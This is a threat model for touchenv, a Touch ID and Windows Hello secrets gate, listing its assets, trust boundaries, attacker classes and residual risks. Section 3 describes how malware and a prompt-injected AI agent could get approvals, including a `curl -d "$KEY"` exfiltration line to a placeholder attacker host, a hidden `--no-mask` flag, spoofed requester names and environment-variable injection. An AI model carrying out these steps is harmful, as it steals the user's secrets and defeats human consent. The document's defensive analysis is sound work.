# Threat model

What touchenv defends, against whom, and where it stops. Written against touchenv 1.8.2 (`touchenv.swift`) and
the Windows port in `windows/`. Function names are the stable references; line numbers are as of 1.8.2. Where
[security.md](security.md), [grants.md](grants.md) or [access-log.md](access-log.md) already explain something,
this page links there instead of repeating it.

## 1. What it protects, and what for

**Assets**

| Asset | Where it lives |
|---|---|
| Secret values at rest (API keys, tokens, `.p8`/`.pem` files, SSH private keys) | macOS: Data Protection keychain, service `touchenv`, touchenv's access group. Windows: `%LOCALAPPDATA%\touchenv\store.json` |
| Copies held for grants | Timed grants and 5-minute approvals: memory of the background copy (`Agent`). Standing grants: Keychain item `touchenv-standing` |
| Secret values in use | The environment of the command `run` starts, or a `NAME:file` temp file; stdout for `get` |
| Approval decisions | Touch ID / Windows Hello prompts, grant state, the `touchenv-agent-key` sealing key |
| Metadata | Secret names, intents, calling programs: the access log, `ssh/*.pub` |

**Purpose.** Keep secrets out of plaintext files (`.env`, config, shell rc), shell history and AI agents'
transcripts, and make every use visible to a person: who asks, which secret, why, and for which command. It is a
consent gate for a single user's machine, not an isolation boundary between programs that run as that user once
a secret has been handed over.

## 2. Components and trust boundaries

**Local items (macOS).** `add()` (touchenv.swift:965) stores a non-synced item with
`SecAccessControlCreateWithFlags(kSecAttrAccessibleWhenUnlockedThisDeviceOnly, .userPresence)`. macOS, not
touchenv, refuses to release the value without a passed `LAContext` (Touch ID or the account password in the
system dialog). touchenv passes its evaluated context in `query()` (870). This is the strongest boundary in the
tool; touchenv relies on Apple's claim that the check is enforced below the user process (see section 6).

**Synced items (macOS).** `add(..., sync: true)` sets `kSecAttrSynchronizable = true` and
`kSecAttrAccessibleWhenUnlocked`, with **no access control** (iCloud Keychain won't accept one). The only things
between a process and the value are:

1. the **keychain access group**: the app is signed with a single `keychain-access-groups` entry
   `TEAMID.BUNDLEID` (build.sh:56), a restricted entitlement that macOS honours only with a matching provisioning
   profile. Queries set no explicit `kSecAttrAccessGroup`, so they use that one group;
2. **touchenv's control flow**: every command that returns a value calls `authenticate()` (807) or
   `approveWithPassword()` (2802) before `read()` (994). For example `case "get"` (4996–4998), `case "run"`
   (5082–5086), `case "export"` (5337–5346), timed `grant` (5294–5299), standing `grant` (5246–5250), and the SSH
   agent's `sign` (3785) via `ask`. The `LAContext` passed in the query is ignored for these items: the touch is
   not cryptographically bound to the read.
3. **hardened runtime**: `codesign -o runtime` (build.sh:59) with no `get-task-allow`, so another process of the
   same user cannot attach a debugger, inject a dylib or set `DYLD_*` to change that control flow.

So a synced secret is as safe as (signature + entitlement enforcement) x (touchenv having no read path that skips
`authenticate`). Anyone who can run code with touchenv's entitlement on a Mac they control — including a genuine
touchenv on an attacker's Mac that has joined your iCloud Keychain — reads it. [security.md](security.md#local-and-synced-secrets)
states this; `syncNote` (310) prints it on every `sync`/`set --sync`.

**The prompt.** `Prompt` (526) is touchenv's own `NSPanel` at `.modalPanel` level with an embedded
`LAAuthenticationView`; without biometrics it falls back to the system dialog (`authenticate`, 820–833). Contents:

- *Who asks*: `requester()` (196) walks up from the parent, skipping shells and wrappers, and names the first other
  process by **argv[0]** read from `KERN_PROCARGS2` (`executableName`, 158). argv[0] is chosen by whoever started
  the process. The icon comes from `requesterIcon()` (238), keyed on the same name. Both are hints, as security.md
  says.
- *Intent*: `--intent`, cleaned by `cleanIntent()` (4526: one line, control and format characters removed, 200
  characters). Written by the requester; it proves nothing.
- *Command* (`run` only): `commandText(argv)` (288) via `visibleText()` (263), which replaces control, bidi,
  private-use and unassigned characters with `�`; `elided()` (279) keeps head and tail of long commands. Only the
  argv after `--` is shown. **Not shown:** the environment the command inherits, how `PATH` resolves the program,
  and touchenv's own flags (notably `--no-mask`).

**`run`.** Builds the child environment from touchenv's own environment plus the secrets (5098–5104) and starts
`/usr/bin/env argv…` (5131), so the program is looked up on the caller's `PATH` and the caller's `NODE_OPTIONS`,
`PYTHONPATH`, `BASH_ENV`, `DYLD_*` (for non-hardened targets) etc. apply. `NAME:file` writes into a fresh `0700`
folder under `FileManager.default.temporaryDirectory` (5108–5124; this honours `$TMPDIR`), files `0600`, removed by
`removeTempDir()` (4461), which overwrites with zeros first. Files left by a SIGKILLed touchenv are swept on the
next `run` with a `:file` spec (`sweepStaleTempDirs`, 4482). Zero-overwrite is best effort on APFS/SSD.

**Output masking.** `shouldMask()` (411) masks stdout/stderr of the child when the stream is not a TTY, when
`requester().isAgent` (argv[0] in a fixed list), or when `CLAUDECODE`/`AI_AGENT` is set. `Masker` (344) replaces
exact byte matches of each value of 6+ bytes and each 16+-byte line of a multi-line value (`maskNeedles`, 327).
It is a guard against accidental echo (`env`, `curl -v`, stack traces), not against a command that encodes,
splits or writes the value elsewhere (files, network, `/dev/tty`). `--no-mask` (4848) turns it off and does not
appear in the prompt.

**5-minute approvals and timed grants.** Held in the memory of `touchenv agent` (`Agent`, 1344). The socket in the
per-user temp dir (`agentSocketPath`, 1074) is `0600`, and every message is AES-GCM sealed with `touchenv-agent-key`
(`agentKey`, 1195; `AgentWire`, 1127) with pid/start-time binding, a 60 s window and nonce replay protection;
`peerIsTouchenv` (1093) is defence in depth only, as its comment says. The agent derives the requester itself from
the kernel process tree. A grant covers any process whose ancestry contains the granted pid+start time
(`coveringGrant`, 1580). Details and limits: [grants.md](grants.md), [security.md](security.md#what-a-touch-approves).

**Standing grants.** A Keychain item (`KeychainStandingStore.put`, 2147) holding a **copy of the secret values**,
`AfterFirstUnlockThisDeviceOnly`, no access control. A local secret placed in a standing grant therefore loses
its macOS `userPresence` lock for that copy and is protected like a synced one (access group + touchenv code).
The program check (`standingDecision`, 2405) and its known bypasses (`BASH_ENV`, exported functions, fork-then-exec,
TOCTOU on the script hash) are in [security.md](security.md#standing-grants).

**`--password`.** Synced items only (`approveWithPassword`, 2802), refused as root, read from `/dev/tty`,
throttled via a Keychain counter. See [security.md](security.md#typing-the-mac-password).

**Access log.** `~/Library/Logs/touchenv-access-YYYY-MM.log`, `0600`, fields cleaned by `logField` (1789). Records
names, intents and programs, never values. Writable by any process of the user: an aid, not evidence.
See [access-log.md](access-log.md).

**Export/import.** ECDH P-256 to a receiving key made by `import --begin` (Secure Enclave when available), HKDF,
AES-GCM with the header authenticated; the receiving key lives an hour and is used once. The prompt on the old
Mac shows a check code (`checkCode`, 2920). The file is **not sender-authenticated**: anyone who sees the
`tenv1:…` string within that hour can build a file that imports values of their choosing (the import prompt lists
the names and an attacker-chosen "from" host name; `--replace` is needed to overwrite existing names).

**Code signing and distribution.** Developer ID signature, hardened runtime, embedded provisioning profile,
notarized and stapled (`release.sh`). The keychain access group is tied to the team ID: any binary that team
signs with that entitlement reads every touchenv item. Builds are made on the maintainer's Mac, not in CI.

**Windows port.** `windows/internal/core/store.go`: each secret is sealed to a P-256 "store key"; the store key's
private half is RSA-encrypted to a Windows Hello key (`winplat/hello_windows.go`, `makeKey`: Microsoft Passport KSP,
`NgcCacheType = AUTH_MANDATORY`, in the TPM when present), and its public half is signed by the Hello key and
checked on use (`verify`). One Hello approval (`unlock`) decrypts the **whole store key**, so the approving
process can open every secret in the file, not just the one named. Prompt text is set by the caller
(`setUI` → `Use Context`), so any program can show any text. Grants live in a service (`NT SERVICE\touchenv`,
pipe DACL in `pipeSDDL`, caller from the pipe token). [windows.md](windows.md) covers the consequences.

## 3. Attackers

### (a) Someone who copies files or backups off the disk

- **Can:** read the access log and `~/Library/Application Support/touchenv/ssh/*.pub` (names, intents, programs,
  public keys); a `NAME:file` temp file only if touchenv was SIGKILLed and the copy happened before the next
  sweep, or `$TMPDIR` pointed at a backed-up/synced folder; on Windows, `store.json` (names in clear, values
  sealed).
- **Cannot:** read values. Local items are `ThisDeviceOnly` and wrapped by the device's Data Protection keys;
  Windows values need the Hello key, which is non-exportable and TPM-bound where a TPM exists.

### (b) Malware running as the same user, no admin

- **Cannot** read items at rest: it lacks the access-group entitlement, and hardened runtime blocks injecting
  into touchenv or its agent. It cannot forge or read agent-socket messages (sealing key in the access group).
- **Can** ask for a secret itself and wait for a habitual touch. It controls everything the prompt calls a hint:
  starting its process with argv[0] `claude` yields "Claude Code" and Claude.app's icon (`requester`,
  `requesterIcon`); the intent is free text.
- **Can** make an innocent-looking command run its code: the prompt shows argv, not the inherited environment or
  `PATH`. `run --intent "monthly report" KEY -- python report.py` with `PYTHONSTARTUP`/`PYTHONPATH`, `NODE_OPTIONS`,
  `BASH_ENV`, or a `python` earlier on `PATH` reads like the real thing. It can also edit `~/.zshrc`, or replace
  the user-writable `~/.local/bin/touchenv` symlink or `~/Applications/touchenv.app` with a wrapper that calls the
  real touchenv with such an environment; the prompt then names the real terminal, since `sh` is skipped.
- **Can** use an active timed grant or 5-minute approval without any prompt, by getting a process started under
  the granted app: `tmux new-window`/`send-keys` into a granted tmux server, a new tab in a granted terminal that
  sources an edited `~/.zshrc`, a hook in an AI agent's settings, AppleScript `do script` (subject to the
  Automation consent prompt). The only signal is the notice `showNotice` flashes and the log line. Standing
  grants are reachable by simply running the granted program (documented).
- **Can**, when codes are on (`touchenv totp setup`), read a code the user gives an agent (the transcript file,
  the process list) and try to spend it first on a timed grant of synced secrets for itself, within the limits of
  setup; or lock codes with five wrong tries. It cannot read the key behind the codes.
- **Can** read a secret while it is in use: the `0600` temp file is the same uid; the child's environment is
  likely readable through `KERN_PROCARGS2`/`ps -E` for same-user processes (unverified here; see section 6).
- **Can** draw its own window above touchenv's `.modalPanel` prompt to change what the text appears to say, while
  the real sensor view underneath still approves touchenv's request (not tested; see section 6).
- **Can** delete or edit the access log, revoke grants (no Touch ID, by design), or delete synced items through
  touchenv by obtaining one approval. On Windows it can also delete entries from `store.json` or replace a value
  (seal a new one with the public store key), and get **every** secret from a single Hello approval it triggers.

### (c) Malware with admin rights (SIP on)

Everything in (b), plus: read any process's environment and any user's temp files; replace admin-writable copies
of touchenv (a cask in `/Applications`) or the user's `PATH` entries; install a keylogger to collect a typed Mac
password (`--password`, and the system password dialog). **Cannot**, as far as the design goes: bypass
`userPresence` on local items, attach to the hardened touchenv agent, or obtain the access-group entitlement
without the team's signing identity. On Windows, admin is out of scope: it can read the service's memory
(grants) and [windows.md](windows.md) says so.

### (d) Admin with SIP disabled (or a macOS bug of that class)

Can run code with a forged entitlement or debug touchenv, so it reads **every synced item**, every **standing-grant
copy** (including copies of local secrets), the agent's in-memory grants, and the sealing key. Local items still
need the user's presence, per Apple's design. It also reads the authenticator key of `grant --totp`, which opens
nothing it could not already read. This is the documented price of `--sync`;
[security.md](security.md#local-and-synced-secrets) does not mention that standing grants carry the same exposure.

### (e) A prompt-injected AI agent

- **Cannot:** pass a `run`/`get`/`ls`/`rm` without `--intent` when it is recognised (`requireIntent`, 434); tick
  "Don't ask again" for itself (no flag exists); read a secret without a prompt unless a grant or approval covers
  its app.
- **Can:** request `touchenv run --intent "<plausible>" KEY -- curl -d "$KEY" https://attacker…`. The command is in
  the prompt; whether that stops it depends on the user reading it. Long or obfuscated commands (`sh -c` with
  base64) are shown elided head and tail.
- **Can:** ask `touchenv get` — an approved value goes straight into the transcript; masking applies to `run` only.
- **Can:** add `--no-mask` and run a benign-looking `env` or `curl -v`; the prompt does not show the flag.
- **Can:** use an open timed grant or 5-minute approval freely until it ends (documented).
- **Can:** when codes are on, ask the user for a code under a pretext and spend it on any timed grant of synced
  secrets up to the limits of setup: the code is not bound to what it approves. **Cannot** run `totp setup`
  (refused for a recognised agent, and Touch ID) or see the key, so it cannot make codes.
- Agents not recognised by argv[0] (e.g. one running as `node`) are not forced to give an intent; output masking
  still applies when output is a pipe or `CLAUDECODE`/`AI_AGENT` is set.

### (f) A stolen or lost Mac

- Locked or powered off: local items (`WhenUnlockedThisDeviceOnly`) and synced items (`WhenUnlocked`) are not
  readable; reading needs the login password. Standing-grant items are `AfterFirstUnlock`: readable by touchenv
  while locked but only by a process that can run as the user, which a thief at the lock screen cannot.
- A running agent keeps grants in memory until they expire, but needs a requester process under the granted app.
- If the thief knows the login password: local items need that password in the system dialog (touchenv's
  fallback), so the password alone opens them; synced items too. The secrets are then theirs. Revoke and rotate.
- Synced items remain on your other Macs; local ones are gone unless exported ([new-mac.md](new-mac.md)).

### (g) Compromise of the iCloud account

iCloud Keychain is end-to-end encrypted; Apple ID credentials alone do not join it. An attacker who also joins a
device to your keychain (with a device passcode or approval from a trusted device) receives every synced item;
installing a genuine touchenv there and touching their own sensor is all the "gate" they face. Local items and
standing grants are not synced. Windows has no sync.

### (h) Supply chain

- **Homebrew tap (`ptrinh/homebrew-tap`)**: whoever can push to it can point the cask at another URL and checksum.
  Gatekeeper still requires a notarized Developer ID signature, but not *this* team's. A binary signed by another
  team cannot read existing items (different access group); it can still show prompts, collect new secrets on
  `set`, or wrap the real touchenv as in (b).
- **GitHub releases**: same; the `.sha256` file sits next to the zip, so it detects corruption, not substitution.
- **Signing identity / Apple account**: anyone holding the Developer ID key and a profile for the App ID can ship
  a build that reads every item, local ones included once the user touches. Notarization is an automated malware
  scan, not a review.
- **Build host**: release builds are made and signed on the maintainer's Mac (`build.sh`, `release.sh`,
  `windows/release.sh`); there is no reproducible build to check a release against the tagged source.
- **Windows**: Authenticode by Trusted Signing (SENPRINTS LLC); same considerations.

## 4. Out of scope

- Protecting a secret after an approved command has it: it can send, store or print it.
- Malware with admin rights on Windows; admin with SIP disabled on macOS for synced items and standing grants.
- Hardware attacks on the Secure Enclave or TPM, and Apple/Microsoft platform bugs.
- Keylogging of the Mac password, shoulder-surfing, coercion.
- Tamper-evident logging: the log is a convenience record.
- Copies the user made before touchenv (old `.env` files, backups, shell history): see bordercheck.
- Multi-user servers and remote sessions: Windows refuses RDP/SSH; macOS signing via SSH is refused unless a grant
  covers it (`serveSSHAgent`, 4403).

## 5. Residual risks, ranked

1. **Habitual approval of a request crafted by malware or an injected agent.** The who and why are
   requester-controlled; the command is real but does not show the environment, `PATH`, or `--no-mask`.
   *Users:* read the command every time; deny anything from an app you did not just use; treat `get` from an agent
   as "print into the transcript". *Project:* show non-default `PATH` resolution and risky inherited variables
   (`*_OPTIONS`, `PYTHON*`, `BASH_ENV`, `DYLD_*`, `LD_*`) in the prompt or strip them; show or refuse `--no-mask`
   from an agent; consider requiring an absolute program path.
2. **Grants reachable by any code that can start a process under the granted app** (tmux, shell rc, agent hooks).
   *Users:* short `--for`, low `--uses`, fewest keys; avoid granting a tmux server or a whole terminal app; `touchenv
   lock` when done; watch the notices.
3. **Synced secrets and standing-grant copies rest on touchenv's code and SIP**, and synced ones on every device in
   your iCloud Keychain. *Users:* keep production, signing, payment and SSH keys local; do not make standing grants
   for those; protect the Apple Account and every Mac in it.
   With `grant --totp` on, a code read to an agent approves whatever grant the agent asks for, within the limits of
   setup. *Users:* low `--max-for` and `--max-uses`; sync only what may be granted from afar; "code already used"
   on a first try is an alarm. *Project:* an approval bound to the request (a passkey signature over it).
4. **Secrets in use are readable by same-user code** (temp file, likely environment). *Users:* prefer short-lived
   commands; do not put `$TMPDIR` in a synced folder.
5. **Windows: one Hello approval exposes the whole store**, and any program can write the prompt text. *Users:* only
   approve prompts you expected; keep the most valuable keys on a Mac.
6. **Supply chain concentrated on one maintainer machine and signing identity.** *Users:* verify the signature
   team (`codesign -dv`) after updates; pin versions for high-value setups. *Project:* reproducible or CI builds
   with attestations; publish the team ID and checksums somewhere independent of the release.
7. **Prompt overlay spoofing** (unverified). *Project:* test it; consider a higher window level or showing
   the request in the system dialog's reason for synced reads too.

## 6. Questions for an external reviewer

1. **Synced read paths.** Is there any path to `SecItemCopyMatching` with `kSecReturnData` on a synced item that
   does not pass `authenticate()`/`approveWithPassword()` first? Start at `readSecret`/`read` (986/994), callers in
   `case "get"`, `"run"`, `"sync"`, `"grant"`, `"export"`, `SSHAgentServer.sign`/`ask` (3785), `ssh load`
   (`sshCommand`, 4546), and `standingSecretChanged` (2529).
2. **`authenticate()` outcomes** (807–835): can a cancelled, timed-out or invalidated `LAContext` (e.g. `Prompt.show`
   timeout, `usePassword`, `.userFallback` mapping to `.password`) ever return as approved? Same for
   `authenticateAsync` (841) in the long-running SSH agent, which reuses the global `context`.
3. **Local-item enforcement.** Confirm that `userPresence` items are released only with a context evaluated in
   *this* process and that the global `context` reuse across reads (`query`, 870) cannot be widened.
4. **Agent socket** (`AgentWire`, `Agent.serve`, `Agent.answer`, 1127–1569): replay, pid reuse between
   `peerPid` and `startTime`, the "for"/"forStart" path used by the SSH agent, and `coveringGrant` ancestry.
5. **Standing grants** (`identifyProgram` 2245, `standingDecision` 2405, `callerStillThere` 2504,
   `pathSafetyProblem` 2181): beyond the documented bypasses, any way for a non-granted program to match.
6. **Process environment visibility** on current macOS: can a same-user process read a child's environment via
   `KERN_PROCARGS2`? (touchenv itself reads argv[0] from it in `executableName`, 158.)
7. **Prompt integrity**: overlay windows above `.modalPanel` (526–708), and whether `visibleText`/`cleanIntent`
   miss any rendering trick (combining marks, look-alike text).
8. **Windows store** (`store.go`: `verify`, `unlock`; `hello_windows.go`: `makeKey`, `withPrompt`): RSA PKCS#1 v1.5
   for wrapping, reliance on the undocumented `NgcCacheType`, and the service pipe's caller identification
   (`service_windows.go`: `clientIdentity`, `tokenUser`).
9. **Export/import** (2897–3006, 5324–5456): the lack of sender authentication, and the 1-hour receiving key.
